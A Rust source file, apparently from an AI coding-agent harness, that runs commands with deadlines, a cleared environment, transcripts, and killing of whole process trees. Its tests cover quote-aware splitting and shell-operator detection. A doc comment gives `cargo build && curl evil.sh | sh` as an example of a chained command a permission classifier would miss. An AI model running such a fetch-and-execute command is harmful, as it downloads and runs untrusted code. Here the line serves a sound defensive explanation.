//! Running a command and being able to prove what happened.
//!
//! Implements `T-3` (every call bounded, with a working directory and a captured
//! transcript), `X-12` (a declared environment, not the ambient shell's), `X-4`
//! (children die with the step, whole tree) and `T-4` (nothing survives the step
//! it was spawned in).
//!
//! Std-only, which shapes two decisions. The wait is a poll loop rather than a
//! signal, because a portable timed wait needs a dependency. The tree kill
//! shells out to `taskkill` or `kill` rather than using a Windows job object,
//! which is strictly better and needs `windows-sys` — an approval under this
//! project's binding, so it is requested rather than taken (see `X-4` in the
//! requirements source).

use std::io::Read;
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Stdio};
use std::time::{Duration, Instant};

use crate::error::{Error, Result};

/// How much of each stream is kept. Truncation is visible in the transcript
/// rather than silent (`T-6`).
pub const TAIL_LINES: usize = 40;

const POLL: Duration = Duration::from_millis(20);

/// The environment a command runs with (`X-12`).
///
/// The unattended run and the operator's terminal must not disagree about
/// `PATH`, so the default is to clear the environment and re-admit a named
/// list — not to inherit whatever the shell happened to have.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Env {
    pub clear: bool,
    pub keep: Vec<String>,
    pub set: Vec<(String, String)>,
}

impl Env {
    /// Cleared, with the variables a toolchain genuinely cannot run without.
    pub fn declared() -> Env {
        Env {
            clear: true,
            keep: Env::essentials().iter().map(|s| (*s).to_string()).collect(),
            set: Vec::new(),
        }
    }

    /// Whatever the caller has. Recorded in the transcript as inherited, so a
    /// gate that only passes because of an ambient variable is visible.
    pub fn inherited() -> Env {
        Env { clear: false, keep: Vec::new(), set: Vec::new() }
    }

    #[cfg(windows)]
    fn essentials() -> &'static [&'static str] {
        &[
            "PATH", "PATHEXT", "SystemRoot", "SystemDrive", "COMSPEC", "TEMP", "TMP",
            "USERPROFILE", "HOMEDRIVE", "HOMEPATH", "APPDATA", "LOCALAPPDATA",
            "NUMBER_OF_PROCESSORS", "PROCESSOR_ARCHITECTURE", "CARGO_HOME", "RUSTUP_HOME",
        ]
    }

    #[cfg(not(windows))]
    fn essentials() -> &'static [&'static str] {
        &["PATH", "HOME", "LANG", "LC_ALL", "TMPDIR", "USER", "SHELL", "CARGO_HOME", "RUSTUP_HOME"]
    }

    pub fn with(mut self, key: impl Into<String>, value: impl Into<String>) -> Env {
        self.set.push((key.into(), value.into()));
        self
    }

    fn apply(&self, command: &mut Command) {
        if self.clear {
            command.env_clear();
            for key in &self.keep {
                if let Ok(value) = std::env::var(key) {
                    command.env(key, value);
                }
            }
        }
        for (key, value) in &self.set {
            command.env(key, value);
        }
    }

    fn describe(&self) -> String {
        if self.clear {
            format!("declared: kept {}, set {}", self.keep.len(), self.set.len())
        } else {
            format!("inherited from the caller, set {}", self.set.len())
        }
    }
}

/// How a command ended.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Exit {
    Code(i32),
    /// Ended without a code — a signal on Unix, or killed from outside.
    NoCode,
    /// Hit its deadline and was killed, along with everything it started.
    TimedOut,
}

impl Exit {
    pub fn is_success(&self) -> bool {
        *self == Exit::Code(0)
    }

    pub fn describe(&self) -> String {
        match self {
            Exit::Code(code) => format!("exit {code}"),
            Exit::NoCode => "ended without an exit code".to_string(),
            Exit::TimedOut => "timed out and was killed".to_string(),
        }
    }
}

/// What a run leaves behind. This *is* the evidence — `V-2` is satisfied by
/// storing one of these, not by anyone reporting that a command went well.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Run {
    pub command: String,
    pub cwd: PathBuf,
    pub env: String,
    pub exit: Exit,
    pub duration_ms: u128,
    pub stdout_tail: String,
    pub stderr_tail: String,
    /// Either stream was cut — what the transcript needs to know.
    pub truncated: bool,
    /// Which stream was cut, for a caller reading one of them (`T-20`).
    ///
    /// The combined flag is right for a transcript and wrong for anything
    /// else. `Repo::plumbing` returns stdout and labelled it from `truncated`,
    /// so a command with a long *stderr* and an empty stdout came back as the
    /// label alone — a caller told it had been handed a tail of nothing.
    pub stdout_truncated: bool,
    pub stderr_truncated: bool,
}

impl Run {
    pub fn is_success(&self) -> bool {
        self.exit.is_success()
    }

    /// The verbatim block that goes in a journal record or a state file.
    pub fn transcript(&self) -> String {
        let mut out = String::new();
        out.push_str(&format!("$ {}\n", self.command));
        out.push_str(&format!("cwd: {}\n", self.cwd.display()));
        out.push_str(&format!("env: {}\n", self.env));
        out.push_str(&format!("{} in {}ms\n", self.exit.describe(), self.duration_ms));
        if self.truncated {
            out.push_str(&format!("(output truncated to the last {TAIL_LINES} lines per stream)\n"));
        }
        if !self.stdout_tail.is_empty() {
            out.push_str("--- stdout ---\n");
            out.push_str(&self.stdout_tail);
            if !self.stdout_tail.ends_with('\n') {
                out.push('\n');
            }
        }
        if !self.stderr_tail.is_empty() {
            out.push_str("--- stderr ---\n");
            out.push_str(&self.stderr_tail);
            if !self.stderr_tail.ends_with('\n') {
                out.push('\n');
            }
        }
        out
    }
}

/// Everything a bounded run needs. There is no constructor without a timeout,
/// on purpose — `T-3` says no unbounded process, ever, and the type is where
/// that is enforced rather than remembered.
#[derive(Debug, Clone)]
pub struct Spec {
    pub command: String,
    pub cwd: PathBuf,
    pub env: Env,
    pub timeout: Duration,
    /// Written to the child's stdin and closed.
    ///
    /// This is how a secret reaches a subprocess without touching argv, which
    /// any other user on the machine can read out of a process listing, or the
    /// filesystem, which outlives the call (`S-2`).
    pub stdin: Option<String>,
    /// Keep every byte of both streams rather than the last [`TAIL_LINES`]
    /// (`T-20`).
    ///
    /// Off by default, because the reason the tail exists is good: a gate that
    /// printed ten thousand lines should not put ten thousand lines in a
    /// journal record. It is for the caller that needs the output as *data* —
    /// a diff to parse rather than a transcript to read — where a silent tail
    /// is not a smaller answer but a wrong one.
    pub keep_all: bool,
    /// The arguments to run, when the caller already has them as a list.
    ///
    /// A gate is a line a person wrote and has to be split. A call we assemble
    /// ourselves is already a list, and flattening it to a line to split it back
    /// apart loses things: an argument containing a space needs quoting, and an
    /// **empty** argument cannot survive the round trip at all.
    ///
    /// That is not hypothetical. `claude --tools ""` means *no tools*, and the
    /// same flag with the empty argument dropped means *every tool* — the exact
    /// opposite, silently. See [`crate::anthropic::cli_invocation`].
    ///
    /// [`Spec::command`] stays as written for the journal, which wants something
    /// a person can read rather than a list.
    pub argv: Option<Vec<String>>,
}

impl Spec {
    pub fn new(command: impl Into<String>, cwd: impl Into<PathBuf>, timeout: Duration) -> Spec {
        Spec {
            command: command.into(),
            cwd: cwd.into(),
            env: Env::declared(),
            timeout,
            stdin: None,
            argv: None,
            keep_all: false,
        }
    }

    /// Feed the child something on stdin. See [`Spec::stdin`].
    pub fn with_stdin(mut self, text: impl Into<String>) -> Spec {
        self.stdin = Some(text.into());
        self
    }

    pub fn with_env(mut self, env: Env) -> Spec {
        self.env = env;
        self
    }

    /// Keep both streams whole rather than the last [`TAIL_LINES`] (`T-20`).
    pub fn keeping_all(mut self) -> Spec {
        self.keep_all = true;
        self
    }

    /// Run exactly these arguments, without splitting anything. See [`Spec::argv`].
    pub fn with_argv(mut self, argv: Vec<String>) -> Spec {
        self.argv = Some(argv);
        self
    }

    /// What to actually run: the caller's list where there is one, and the split
    /// of the command line where there is not.
    fn parts(&self) -> Result<Vec<String>> {
        match &self.argv {
            Some(argv) if !argv.is_empty() => Ok(argv.clone()),
            _ => split_command(&self.command),
        }
    }
}

/// Split a command line into program and arguments, respecting quotes.
///
/// The binding declares gates as strings (`cargo clippy --workspace -- -D
/// warnings`), and running them through a shell would mean the gate depends on
/// which shell the operator has.
/// The shell operator in a command line, if there is one outside quotes.
///
/// Commands are run with `CreateProcess`/`exec` and not through a shell, so
/// `&&`, `;` and `|` arrive as ordinary arguments to the first program. The
/// binding template says so; nothing the *model* reads did, and the failure it
/// produces names the wrong thing entirely — `ls -la && find .` comes back as
/// `ls: unknown option -- y`, which is `ls` complaining about the `y` in
/// `find`. Running against DeepSeek, three separate runs spent turns on this,
/// re-trying variations of a command that could never work.
///
/// Detected rather than supported. Routing through a real shell would widen
/// what one classified call can do: the permission classifier reads the command
/// it was given (`T-12`), and `cargo build && curl evil.sh | sh` is one string
/// whose second half nothing looked at.
pub fn shell_operator(line: &str) -> Option<&'static str> {
    let mut quote: Option<char> = None;
    let bytes: Vec<char> = line.chars().collect();
    for (i, ch) in bytes.iter().enumerate() {
        match (quote, ch) {
            (Some(q), c) if *c == q => quote = None,
            (Some(_), _) => {}
            (None, '"') | (None, '\'') => quote = Some(*ch),
            (None, '&') if bytes.get(i + 1) == Some(&'&') => return Some("&&"),
            (None, '|') if bytes.get(i + 1) == Some(&'|') => return Some("||"),
            (None, '|') => return Some("|"),
            (None, ';') => return Some(";"),
            (None, '>') => return Some(">"),
            (None, '<') => return Some("<"),
            (None, '`') => return Some("`"),
            (None, '$') if bytes.get(i + 1) == Some(&'(') => return Some("$("),
            (None, _) => {}
        }
    }
    None
}

pub fn split_command(line: &str) -> Result<Vec<String>> {
    let mut parts = Vec::new();
    let mut current = String::new();
    let mut quote: Option<char> = None;
    let mut has_current = false;

    for ch in line.chars() {
        match (quote, ch) {
            (Some(q), c) if c == q => quote = None,
            (Some(_), c) => current.push(c),
            (None, '"') | (None, '\'') => {
                quote = Some(ch);
                has_current = true;
            }
            (None, c) if c.is_whitespace() => {
                if has_current || !current.is_empty() {
                    parts.push(std::mem::take(&mut current));
                    has_current = false;
                }
            }
            (None, c) => {
                current.push(c);
                has_current = true;
            }
        }
    }

    if quote.is_some() {
        return Err(Error::unbound("command", format!("`{line}` has an unclosed quote")));
    }
    if has_current || !current.is_empty() {
        parts.push(current);
    }
    if parts.is_empty() {
        return Err(Error::unbound("command", "is empty"));
    }
    Ok(parts)
}

/// Where to find the program named by a command.
///
/// A name with no separator in it — `python`, `cargo`, `git` — is a `PATH`
/// lookup and is left alone. A name *with* one — `.venv/Scripts/python.exe` —
/// is a path, and a relative path is meant relative to the directory the
/// command runs in.
///
/// The platform does not read it that way. `Command::current_dir` sets where
/// the child starts, not where its executable is looked for: on Windows the
/// program is resolved against the **parent's** directory, so a binding naming
/// `.venv/Scripts/python.exe` worked when `perp` happened to be run from the
/// workspace and failed when it was run with `--root` from anywhere else — the
/// editor starts a cycle exactly that way. Joining it here makes the two agree,
/// which is what a person writing that line already assumed.
///
/// Left alone when the join does not exist, so the error still names what was
/// asked for rather than a path this function invented.
/// A bare program name, resolved the way a shell would, for callers that spawn
/// their own child rather than going through [`run`].
///
/// The streaming reader is one: it owns its process so it can enforce a
/// first-token deadline, and `claude` on Windows is a `.cmd` that
/// `CreateProcess` will not find on its own.
pub fn program_path(program: &str) -> std::ffi::OsString {
    resolve_program(program, Path::new("."))
}

fn resolve_program(program: &str, cwd: &Path) -> std::ffi::OsString {
    let named = Path::new(program);
    if named.is_absolute() {
        return program.into();
    }
    if named.parent() != Some(Path::new("")) {
        let joined = cwd.join(named);
        return if joined.exists() { joined.into_os_string() } else { program.into() };
    }
    // A bare name is a `PATH` lookup, and on Windows the platform's own is not
    // the one anybody means. See [`on_path`].
    on_path(program).unwrap_or_else(|| program.into())
}

/// A bare program name, found the way a shell would.
///
/// Only on Windows, and only because the platform's own lookup is narrower than
/// every other tool's. `CreateProcess` searches `PATH` but appends `.exe` and
/// nothing else — it never consults `PATHEXT`. So `flutter`, whose whole
/// installation is `flutter.bat`, cannot be spawned by that name at all, and
/// neither can `npm`, `npx`, `yarn`, `pnpm` or `gradle`. A binding declaring
/// `gate.test = flutter test` failed before running with "the system cannot
/// find the file specified" — reported against the *working directory*, because
/// that is what the spawn error carries, so the message named the one thing
/// that was fine.
///
/// It can *run* a `.bat` perfectly well once given the full path. Only finding
/// it is broken, so finding it is all this does.
///
/// `None` when nothing matches, and the caller then passes the name through so
/// the platform's own error stands rather than one invented here.
#[cfg(windows)]
fn on_path(program: &str) -> Option<std::ffi::OsString> {
    if Path::new(program).extension().is_some() {
        return None;
    }
    // The user's own list, in their own order: `.COM` before `.EXE` before
    // `.BAT` is what the shell does, and a project with both `x.exe` and
    // `x.bat` means the same thing by `x` as its terminal does.
    let pathext = std::env::var("PATHEXT").unwrap_or_else(|_| ".COM;.EXE;.BAT;.CMD".to_string());
    let path = std::env::var_os("PATH")?;
    for dir in std::env::split_paths(&path) {
        for ext in pathext.split(';').filter(|e| !e.is_empty()) {
            let candidate = dir.join(format!("{program}{ext}"));
            if candidate.is_file() {
                return Some(candidate.into_os_string());
            }
        }
    }
    None
}

/// Everywhere else `execvp` already does this, and correctly.
#[cfg(not(windows))]
fn on_path(_program: &str) -> Option<std::ffi::OsString> {
    None
}

/// Run a command to completion or to its deadline, whichever comes first.
pub fn run(spec: &Spec) -> Result<Run> {
    let parts = spec.parts()?;
    let (program, args) = parts.split_first().ok_or_else(|| {
        Error::unbound("command", "is empty")
    })?;

    let mut command = Command::new(resolve_program(program, &spec.cwd));
    command
        .args(args)
        .current_dir(&spec.cwd)
        .stdin(if spec.stdin.is_some() { Stdio::piped() } else { Stdio::null() })
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    spec.env.apply(&mut command);
    lead_process_group(&mut command);

    let started = Instant::now();
    let mut child = command.spawn().map_err(|e| Error::io(&spec.cwd, e))?;
    let pid = child.id();

    // Written and closed before the wait: a child reading stdin to EOF would
    // otherwise sit there until the deadline killed it.
    if let Some(text) = &spec.stdin {
        if let Some(mut pipe) = child.stdin.take() {
            use std::io::Write as _;
            let _ = pipe.write_all(text.as_bytes());
        }
    }

    // Drained on threads: a child that fills a pipe while we poll would block
    // forever, and a deadlock is not a timeout.
    let out_reader = child.stdout.take().map(drain);
    let err_reader = child.stderr.take().map(drain);

    let exit = wait_with_deadline(&mut child, pid, spec.timeout, started)?;

    let stdout = out_reader.map(join).unwrap_or_default();
    let stderr = err_reader.map(join).unwrap_or_default();
    // `T-20`: a caller that asked for the whole thing gets the whole thing.
    let (stdout_tail, out_cut) =
        if spec.keep_all { (stdout, false) } else { tail(&stdout) };
    let (stderr_tail, err_cut) =
        if spec.keep_all { (stderr, false) } else { tail(&stderr) };

    Ok(Run {
        command: spec.command.clone(),
        cwd: spec.cwd.clone(),
        env: spec.env.describe(),
        exit,
        duration_ms: started.elapsed().as_millis(),
        stdout_tail,
        stderr_tail,
        truncated: out_cut || err_cut,
        stdout_truncated: out_cut,
        stderr_truncated: err_cut,
    })
}

fn wait_with_deadline(
    child: &mut Child,
    pid: u32,
    timeout: Duration,
    started: Instant,
) -> Result<Exit> {
    loop {
        match child.try_wait() {
            Ok(Some(status)) => {
                return Ok(match status.code() {
                    Some(code) => Exit::Code(code),
                    None => Exit::NoCode,
                })
            }
            Ok(None) => {}
            Err(e) => return Err(Error::io(".", e)),
        }
        if started.elapsed() >= timeout {
            kill_tree(pid);
            let _ = child.wait();
            return Ok(Exit::TimedOut);
        }
        std::thread::sleep(POLL);
    }
}

fn drain<R: Read + Send + 'static>(mut reader: R) -> std::thread::JoinHandle<String> {
    std::thread::spawn(move || {
        let mut buffer = Vec::new();
        let _ = reader.read_to_end(&mut buffer);
        String::from_utf8_lossy(&buffer).into_owned()
    })
}

fn join(handle: std::thread::JoinHandle<String>) -> String {
    handle.join().unwrap_or_default()
}

fn tail(text: &str) -> (String, bool) {
    let lines: Vec<&str> = text.lines().collect();
    if lines.len() <= TAIL_LINES {
        return (text.to_string(), false);
    }
    (lines[lines.len() - TAIL_LINES..].join("\n"), true)
}

/// Kill a process and everything it started (`X-4`).
///
/// Best effort by design: the tree may already be gone, and failing to kill a
/// dead process is not an error worth propagating into a gate result.
pub fn kill_tree(pid: u32) {
    let killer = tree_killer(pid);
    if let Some((program, args)) = killer {
        let _ = Command::new(program)
            .args(args)
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status();
    }
}

#[cfg(windows)]
fn tree_killer(pid: u32) -> Option<(&'static str, Vec<String>)> {
    Some(("taskkill", vec!["/F".into(), "/T".into(), "/PID".into(), pid.to_string()]))
}

#[cfg(not(windows))]
fn tree_killer(pid: u32) -> Option<(&'static str, Vec<String>)> {
    // Negative pid is the process group, which `lead_process_group` made this
    // child the leader of.
    Some(("kill", vec!["-9".into(), format!("-{pid}")]))
}

#[cfg(unix)]
fn lead_process_group(command: &mut Command) {
    use std::os::unix::process::CommandExt;
    command.process_group(0);
}

#[cfg(not(unix))]
fn lead_process_group(_command: &mut Command) {
    // Windows has no process groups in this sense; `taskkill /T` walks the
    // parent chain instead.
}

/// Children that must not outlive the step that spawned them (`T-4`).
///
/// A dev server left running across steps is a leak the next gate will blame on
/// the wrong feature.
#[derive(Debug, Default)]
pub struct Nursery {
    children: Vec<Child>,
    /// The kernel-owned set every child joins (`X-4`). Created lazily: a
    /// nursery that never spawns should not create a job object.
    job: Option<crate::job::Job>,
    containment: Option<crate::job::Containment>,
}

impl Nursery {
    pub fn new() -> Nursery {
        Nursery::default()
    }

    /// How this nursery's children are actually contained, once it has spawned
    /// something. `None` before the first spawn — there is nothing to contain,
    /// and claiming a guarantee about an empty set would be the sort of true
    /// statement that misleads.
    pub fn containment(&self) -> Option<crate::job::Containment> {
        self.containment
    }

    fn ensure_job(&mut self) {
        if self.containment.is_some() {
            return;
        }
        match crate::job::Job::create() {
            Some(job) => {
                self.job = Some(job);
                self.containment = Some(if cfg!(windows) {
                    crate::job::Containment::JobObject
                } else {
                    crate::job::Containment::ProcessGroup
                });
            }
            // Reported rather than hidden: the loop still runs, and the
            // journal can say the weaker guarantee was in force.
            None => self.containment = Some(crate::job::Containment::ParentWalk),
        }
    }

    pub fn adopt(&mut self, child: Child) {
        self.children.push(child);
    }

    pub fn spawn(&mut self, spec: &Spec) -> Result<u32> {
        let parts = spec.parts()?;
        let (program, args) = parts
            .split_first()
            .ok_or_else(|| Error::unbound("command", "is empty"))?;
        let mut command = Command::new(program);
        command
            .args(args)
            .current_dir(&spec.cwd)
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null());
        spec.env.apply(&mut command);
        lead_process_group(&mut command);
        self.ensure_job();
        let child = command.spawn().map_err(|e| Error::io(&spec.cwd, e))?;
        let pid = child.id();

        // Adopted immediately after spawn. Everything the child starts from
        // here inherits membership, so the tree is contained without the
        // harness having to find it.
        if let Some(job) = &self.job {
            if !job.adopt(pid) {
                self.containment = Some(crate::job::Containment::ParentWalk);
            }
        }

        self.children.push(child);
        Ok(pid)
    }

    pub fn len(&self) -> usize {
        self.children.len()
    }

    pub fn is_empty(&self) -> bool {
        self.children.is_empty()
    }

    /// Kill every tracked child and its tree. Returns how many were still alive.
    pub fn kill_all(&mut self) -> usize {
        let mut killed = 0;
        for mut child in std::mem::take(&mut self.children) {
            if matches!(child.try_wait(), Ok(None)) {
                kill_tree(child.id());
                killed += 1;
            }
            let _ = child.wait();
        }
        killed
    }
}

impl Drop for Nursery {
    fn drop(&mut self) {
        self.kill_all();
    }
}

#[cfg(test)]
mod tests {

    /// `CreateProcess` appends `.exe` and never reads `PATHEXT`, so a tool whose
    /// whole installation is a `.bat` — `flutter`, `npm`, `yarn`, `gradle` —
    /// could not be named in a binding at all. It could always *run* one; it
    /// just could not find it.
    #[cfg(windows)]
    #[test]
    fn a_bat_on_the_path_is_found_by_its_bare_name() {
        let dir = crate::testutil::tmpdir("process-pathext");
        std::fs::write(dir.join("perp-probe-tool.bat"), "@echo off\r\necho from the bat\r\n")
            .expect("write");

        // The lookup reads the environment, the same as a shell would.
        let old = std::env::var_os("PATH");
        let mut entries = vec![dir.clone()];
        if let Some(existing) = &old {
            entries.extend(std::env::split_paths(existing));
        }
        std::env::set_var("PATH", std::env::join_paths(entries).expect("join"));

        let run = run(&Spec::new("perp-probe-tool", &dir, Duration::from_secs(30)));

        match old {
            Some(value) => std::env::set_var("PATH", value),
            None => std::env::remove_var("PATH"),
        }

        let run = run.expect("a .bat on PATH must be spawnable by its bare name");
        assert!(run.is_success(), "{}", run.transcript());
        assert!(run.stdout_tail.contains("from the bat"), "{}", run.transcript());
    }

    /// A name that is already a full file name is left alone: resolving it a
    /// second time could pick a different file with the same stem.
    #[cfg(windows)]
    #[test]
    fn a_name_that_already_has_an_extension_is_not_re_resolved() {
        assert_eq!(on_path("flutter.bat"), None);
        assert_eq!(on_path("cargo.exe"), None);
    }


    /// A binding may name its own interpreter — `.venv/Scripts/python` — and
    /// mean it relative to where the command runs. The platform does not: the
    /// program is looked up against the *parent's* directory, so this worked
    /// only when `perp` happened to be started from the workspace and failed
    /// when it was started with `--root` from anywhere else, which is how the
    /// editor starts a cycle.
    #[test]
    fn a_relative_program_is_found_beside_the_working_directory() {
        let dir = crate::testutil::tmpdir("process-relative-program");
        let nested = dir.join("tools");
        std::fs::create_dir_all(&nested).expect("dirs");

        // A real executable, named by a path relative to `cwd`.
        let name = if cfg!(windows) { "say.bat" } else { "say.sh" };
        let script = nested.join(name);
        if cfg!(windows) {
            std::fs::write(&script, "@echo off\r\necho found me\r\n").expect("write");
        } else {
            std::fs::write(&script, "#!/bin/sh\necho found me\n").expect("write");
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755))
                    .expect("chmod");
            }
        }

        let relative = format!("tools/{name}");
        let spec = Spec::new(relative, &dir, Duration::from_secs(30));
        let run = run(&spec).expect("run");
        assert!(run.is_success(), "{}", run.transcript());
        assert!(run.stdout_tail.contains("found me"), "{}", run.transcript());
    }

    /// A bare name is a `PATH` lookup and must stay one — joining it to the
    /// working directory would break every ordinary gate.
    #[test]
    fn a_bare_program_name_is_still_looked_up_on_the_path() {
        let dir = crate::testutil::tmpdir("process-bare-program");
        let command = if cfg!(windows) { "cmd /c echo hello" } else { "echo hello" };
        let run = run(&Spec::new(command, &dir, Duration::from_secs(30))).expect("run");
        assert!(run.is_success(), "{}", run.transcript());
        assert!(run.stdout_tail.contains("hello"), "{}", run.transcript());
    }

    use super::*;
    use crate::testutil::tmpdir;

    /// A one-liner through the platform's shell, for tests only — the gate
    /// runner itself never goes through a shell.
    fn script(body: &str) -> String {
        if cfg!(windows) {
            format!("cmd /C \"{body}\"")
        } else {
            format!("sh -c \"{body}\"")
        }
    }

    fn sleeper(seconds: u32) -> String {
        if cfg!(windows) {
            // ping is the dependency-free sleep on Windows.
            format!("cmd /C \"ping -n {} 127.0.0.1 > nul\"", seconds + 1)
        } else {
            format!("sh -c \"sleep {seconds}\"")
        }
    }

    /// The failure this prevents named the wrong thing entirely.
    ///
    /// `ls -la && find .` runs `ls` with `-la`, `&&`, `find` and `.` as
    /// arguments, and `ls` reports `unknown option -- y` — the `y` in `find`.
    /// Nothing in that message points at the operator, so a model reads it as a
    /// bad flag and tries another spelling. Measured against DeepSeek: three
    /// runs spent turns on variations of a command that could never work.
    #[test]
    fn a_shell_operator_is_found_so_it_can_be_refused_by_name() {
        assert_eq!(shell_operator("ls -la && find ."), Some("&&"));
        assert_eq!(shell_operator("ls -la; cat pubspec.yaml"), Some(";"));
        assert_eq!(shell_operator("flutter analyze | tail -20"), Some("|"));
        assert_eq!(shell_operator("cargo build > out.txt"), Some(">"));
        assert_eq!(shell_operator("echo $(whoami)"), Some("$("));
        assert_eq!(shell_operator("cargo --version"), None);
    }

    /// A quoted operator is an argument, not an operator. Refusing it would
    /// make `grep` useless for half the patterns worth searching for.
    #[test]
    fn an_operator_inside_quotes_is_just_text() {
        assert_eq!(shell_operator(r#"grep "a && b" file.txt"#), None);
        assert_eq!(shell_operator("grep 'x | y' file.txt"), None);
        assert_eq!(
            shell_operator(r#"grep "a && b" file.txt | head"#),
            Some("|"),
            "but one outside the quotes still counts"
        );
    }

    #[test]
    fn splits_a_command_line_respecting_quotes() {
        assert_eq!(
            split_command("cargo clippy --workspace -- -D warnings").expect("split"),
            vec!["cargo", "clippy", "--workspace", "--", "-D", "warnings"]
        );
        assert_eq!(
            split_command("git commit -m \"a message with spaces\"").expect("split"),
            vec!["git", "commit", "-m", "a message with spaces"]
        );
        assert_eq!(
            split_command("  spaced   out  ").expect("split"),
            vec!["spaced", "out"]
        );
    }

    #[test]
    fn rejects_a_command_it_cannot_run() {
        assert!(split_command("git commit -m \"unclosed").is_err());
        assert!(split_command("   ").is_err());
    }

    /// An argument list is run as given, and an **empty** argument in it survives.
    ///
    /// This is the whole point of [`Spec::argv`]. `claude --tools ""` means no
    /// tools and `claude --tools` means every tool, so an empty argument quietly
    /// dropped on the way to the child inverts the flag that keeps a second agent
    /// from editing the workspace behind the harness's back.
    ///
    /// The loss is in the **join**, not the split: `split_command` gives an empty
    /// token back for a `""` that is still written in the line, but a list joined
    /// on spaces has no way to write one, so by then it is already gone.
    #[test]
    fn an_argument_list_is_run_as_given_including_an_empty_argument() {
        let argv = vec!["claude".to_string(), "--tools".to_string(), String::new()];
        let spec =
            Spec::new(argv.join(" "), ".", Duration::from_secs(1)).with_argv(argv.clone());
        assert_eq!(spec.parts().expect("parts"), argv, "the list is used as given");

        // The same spec without the list: what the child would have been given.
        let flattened = Spec::new(argv.join(" "), ".", Duration::from_secs(1));
        let parts = flattened.parts().expect("parts");
        assert_eq!(parts, vec!["claude", "--tools"], "the empty argument is gone: {parts:?}");
    }

    /// A gate is still a line a person wrote, and still gets split.
    #[test]
    fn a_spec_with_no_argument_list_still_splits_its_command_line() {
        let spec = Spec::new("cargo test --workspace", ".", Duration::from_secs(1));
        assert_eq!(spec.parts().expect("parts"), vec!["cargo", "test", "--workspace"]);
    }

    #[test]
    fn captures_the_exit_code_and_the_output() {
        let dir = tmpdir("proc-exit");
        let spec = Spec::new(script("echo hello && exit 3"), &dir, Duration::from_secs(30));
        let run = run(&spec).expect("run");
        assert_eq!(run.exit, Exit::Code(3));
        assert!(!run.is_success());
        assert!(run.stdout_tail.contains("hello"), "stdout: {:?}", run.stdout_tail);
        assert!(run.transcript().contains("exit 3"), "{}", run.transcript());
    }

    #[test]
    fn a_command_that_hangs_is_killed_at_its_deadline() {
        // `T-3`: no unbounded process, ever.
        let dir = tmpdir("proc-timeout");
        let spec = Spec::new(sleeper(30), &dir, Duration::from_millis(400));
        let started = Instant::now();
        let run = run(&spec).expect("run");
        assert_eq!(run.exit, Exit::TimedOut);
        assert!(
            started.elapsed() < Duration::from_secs(15),
            "it waited {:?}, so the deadline did nothing",
            started.elapsed()
        );
        assert!(run.transcript().contains("timed out"));
    }

    #[test]
    fn runs_in_the_working_directory_it_was_given() {
        let dir = tmpdir("proc-cwd");
        std::fs::write(dir.join("marker.txt"), "here").expect("write");
        let listing = if cfg!(windows) { script("dir /B") } else { script("ls") };
        let run = run(&Spec::new(listing, &dir, Duration::from_secs(30))).expect("run");
        assert!(run.stdout_tail.contains("marker.txt"), "stdout: {:?}", run.stdout_tail);
    }

    #[test]
    fn the_environment_is_declared_not_inherited() {
        // `X-12`: the unattended run and the operator's terminal must not
        // disagree. An ambient variable must not reach the command.
        let dir = tmpdir("proc-env");
        std::env::set_var("PERP_AMBIENT_LEAK", "leaked");

        let echo = if cfg!(windows) {
            script("echo [%PERP_AMBIENT_LEAK%] [%PERP_DECLARED%]")
        } else {
            script("echo [$PERP_AMBIENT_LEAK] [$PERP_DECLARED]")
        };
        let spec = Spec::new(echo, &dir, Duration::from_secs(30))
            .with_env(Env::declared().with("PERP_DECLARED", "declared"));
        let run = run(&spec).expect("run");

        assert!(!run.stdout_tail.contains("leaked"), "ambient leak: {:?}", run.stdout_tail);
        assert!(run.stdout_tail.contains("declared"), "declared missing: {:?}", run.stdout_tail);
        assert!(run.env.starts_with("declared:"), "{}", run.env);
    }

    #[test]
    fn long_output_is_tailed_and_says_so() {
        let dir = tmpdir("proc-tail");
        let body = if cfg!(windows) {
            script("for /L %i in (1,1,120) do @echo line%i")
        } else {
            script("for i in $(seq 1 120); do echo line$i; done")
        };
        let run = run(&Spec::new(body, &dir, Duration::from_secs(60))).expect("run");
        assert!(run.truncated, "120 lines should have been truncated");
        assert_eq!(run.stdout_tail.lines().count(), TAIL_LINES);
        assert!(run.stdout_tail.contains("line120"), "the tail keeps the end, not the start");
        assert!(run.transcript().contains("truncated"), "truncation must be visible");
    }

    #[test]
    fn a_spawned_child_is_contained_by_the_kernel_not_by_a_parent_walk() {
        // `X-4`. `taskkill /T` walks the parent chain, so a grandchild whose
        // immediate parent has exited is an orphan and survives — and none of
        // it runs at all if the engine is killed -9. The job object (Windows)
        // and the process group (POSIX) are kernel-owned and do not care.
        let dir = tmpdir("nursery-containment");
        let mut nursery = Nursery::new();
        assert_eq!(nursery.containment(), None, "nothing spawned, nothing claimed");

        let spec = Spec::new(script("ping -n 3 127.0.0.1"), &dir, Duration::from_secs(10));
        nursery.spawn(&spec).expect("spawn");

        let containment = nursery.containment().expect("something was spawned");
        assert!(
            containment.survives_engine_death(),
            "the guarantee `X-4` asks for is not in force: {}",
            containment.describe()
        );
        assert_eq!(nursery.kill_all(), 1);
    }

    #[test]
    fn the_nursery_kills_what_it_spawned() {
        // `T-4`: nothing survives the step it was spawned in.
        let dir = tmpdir("proc-nursery");
        let mut nursery = Nursery::new();
        nursery
            .spawn(&Spec::new(sleeper(60), &dir, Duration::from_secs(60)))
            .expect("spawn");
        assert_eq!(nursery.len(), 1);
        assert_eq!(nursery.kill_all(), 1, "the child was still alive and had to be killed");
        assert!(nursery.is_empty());
    }
}
